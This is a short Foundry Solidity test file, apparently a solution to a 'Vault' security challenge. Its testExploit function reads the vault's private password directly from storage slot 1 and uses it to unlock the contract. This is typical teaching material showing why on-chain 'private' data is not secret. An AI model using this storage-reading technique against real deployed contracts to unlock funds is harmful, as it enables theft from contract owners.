// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Test.sol";
import {Vault} from "../src/Vault.sol";
contract VaultTest is Test {
    Vault public vaultContract;
    address public attacker;

    function setUp() public {
        attacker = vm.addr(1);
        vaultContract =  new Vault("123");    
    }
    function testExploit() public {
        vm.startPrank(attacker);
        bytes32 password = vm.load(address(vaultContract), bytes32(uint256(1)));
        vaultContract.unlock(password);
        vm.stopPrank();

        assert(vaultContract.locked() == false);
    }
}
